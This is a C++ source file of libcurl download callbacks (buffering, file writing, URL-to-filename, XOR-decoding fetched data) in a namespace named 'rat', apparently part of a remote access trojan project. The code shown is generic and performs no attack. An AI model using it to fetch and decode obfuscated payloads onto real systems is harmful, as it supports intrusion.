/*rat_networking/src/helper.cpp */
#include "rat/networking/helpers.hpp"

#include <cstdint>
#include <cstring>
#include <filesystem>
#include <string>
#include <vector>

namespace rat::networking {

std::filesystem::path _getFilePathFromUrl(const std::string &arg_Url) {
	std::string filename = arg_Url.substr(arg_Url.find_last_of("/\\") + 1);
	if(filename.empty())
		filename = "downloaded_file";
	return std::filesystem::path(filename);
}

size_t _cbWriteDiscard(void *p_Contents, size_t arg_Size, size_t arg_Nmemb,
                       void *p_User) {
	(void)p_Contents;
	(void)p_User;
	return arg_Size * arg_Nmemb;
}

size_t _cbHeapWrite(void *p_Contents, size_t arg_Size, size_t arg_Nmemb,
                    void *p_User) {
	auto *buffer = static_cast<std::vector<char> *>(p_User);
	const size_t total_size = arg_Size * arg_Nmemb;
	const char *src = static_cast<const char *>(p_Contents);
	buffer->insert(buffer->end(), src, src + total_size);
	return total_size;
}

size_t _cbFileWrite(void *p_Contents, size_t arg_Size, size_t arg_Nmemb,
                    void *p_User) {
	FILE *fp = static_cast<FILE *>(p_User);
	return std::fwrite(p_Contents, arg_Size, arg_Nmemb, fp);
}

size_t _cbStackWrite(void *p_Contents, size_t arg_Size, size_t arg_Nmemb,
                     void *p_User) {
	const size_t total_size = arg_Size * arg_Nmemb;
	auto *context = static_cast<BufferContext *>(p_User);

	const size_t space_left = (context->capacity > context->size)
	                              ? (context->capacity - context->size)
	                              : 0;
	const size_t copy_size =
	    (total_size < space_left) ? total_size : space_left;

		if(copy_size > 0) {
			std::memcpy(context->buffer + context->size, p_Contents, copy_size);
			context->size += copy_size;
		}
	return copy_size;
}

size_t _cbVectorUint8Write(void *p_Contents, size_t arg_Size, size_t arg_Nmemb,
                           void *p_User) {
	auto *buffer = static_cast<std::vector<uint8_t> *>(p_User);
	const size_t total_size = arg_Size * arg_Nmemb;
	const uint8_t *src = static_cast<const uint8_t *>(p_Contents);
	buffer->insert(buffer->end(), src, src + total_size);
	return total_size;
}

size_t _cbVectorCharWrite(void *p_Contents, size_t arg_Size, size_t arg_Nmemb,
                          void *p_User) {
	auto *buffer = static_cast<std::vector<char> *>(p_User);
	const size_t total_size = arg_Size * arg_Nmemb;
	const char *src = static_cast<const char *>(p_Contents);
	buffer->insert(buffer->end(), src, src + total_size);
	return total_size;
}

size_t _cbVectorXoredDataWrite(void *p_Contents, size_t arg_Size,
                               size_t arg_Nmemb, void *p_User) {
	size_t totalBytes = arg_Size * arg_Nmemb;
	auto *state = static_cast<XorDataContext *>(p_User);

	const uint8_t *data = static_cast<uint8_t *>(p_Contents);
	const std::string *p_key = state->p_key;
		for(size_t i = 0; i < totalBytes; i++) {
			uint8_t b = data[i];
			uint8_t k =
			    static_cast<uint8_t>((*p_key)[state->position % p_key->size()]);
			uint8_t x = b ^ k;
			state->p_buffer->push_back(x);
			state->position++;
		}

	return totalBytes; // tell libcurl we consumed everything
}

} // namespace rat::networking
